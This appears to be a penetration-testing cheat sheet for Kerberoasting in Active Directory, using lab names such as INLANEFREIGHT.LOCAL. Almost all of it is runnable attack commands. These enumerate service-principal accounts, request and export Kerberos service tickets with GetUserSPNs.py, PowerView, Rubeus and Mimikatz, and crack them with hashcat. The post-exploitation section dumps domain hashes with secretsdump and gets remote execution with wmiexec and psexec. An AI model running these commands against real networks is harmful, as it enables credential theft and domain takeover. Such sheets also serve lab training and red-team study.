# Kerberoasting

## Enumeration

```
============ From Linux ============
# LDAP Query
ldapsearch -x -h dc-ip -b "DC=domain,DC=com" "(servicePrincipalName=*)" servicePrincipalName sAMAccountName memberOf
ldapsearch -x -h dc-ip -b "DC=domain,DC=com" -H ldap://dc-ip "(servicePrincipalName=*)" servicePrincipalName userAccountControl sAMAccountName

# CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
crackmapexec ldap dc-ip -u username -p password -M kerberoast 
cme ldap dc-ip -u 'domain\user' -p 'pass' --k --sam

# SPN Users Enum and TGS Dump
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/ ( Anonymous )
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile kerberoast_hashes.txt
GetUserSPNs.py -request -dc-ip dc-ip domain/user:password -outputfile spn_hashes.txt

# Secretdumps
secretsdump.py -just-dc domain/admin@dc-ip
grep -i "serviceprincipalname" dump.txt

============ From Windows ============
# SPN Users
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -SPNTicket -Verbose | Select samaccountname,serviceprincipalname
Get-DomainUser | Where {$_.serviceprincipalname -ne $null} -PipelineVariable User | ForEach-Object {Get-DomainSPNTicket $User.ServicePrincipalName | Select $User.samaccountname}
Get-DomainUser -SPNTicket | ?{$_.EncryptionType -eq 'RC4-HMAC'}
Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(admincount=1))"
Get-DomainUser -SPN -Properties samaccountname,admincount,pwdlastset,msds-supportedencryptiontypes

Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# SetSPN
setspn.exe -Q */*
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Toolsuz Kerberoasting
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

echo "<base64 blob>" |  tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

# Service Accounts
Get-NetUser -ServiceAccount
Get-DomainSPN -Identity *<SERVICE_NAME>* | Select serviceprincipalname,distinguishedname

# Rubeus
.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt /stats
.\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /tgtdeleg /user:targetuser /nowrap

Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

$krb5tgs$18$ -m 19700
$krb5tgs$23$ -m 13100
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

## Attack Vector

```
# TGS Request və Dump
GetUserSPNs.py -request -dc-ip dc-ip 'domain\user:password' -target-user svc-sql -outputfile roast.txt

echo "svc-sql\nsvc-web" > users.txt
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Hash Crack ( Kerberos 5 TGS-REP etype 23 )
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Rubeus
Rubeus.exe kerberoast /user:svc-sql /service:HTTP/web.domain.com /ptt

# CrackMapExec
cme smb dc-ip -u user -p pass -M kerberoast
```

## Post Exploitation

```
secretsdump.py 'domain/svc-sql:crackedpass'@dc-ip -just-dc-user admin

wmiexec.py 'domain/svc-sql:crackedpass'@target-server
psexec.py 'domain/svc-sql:crackedpass'@target-server

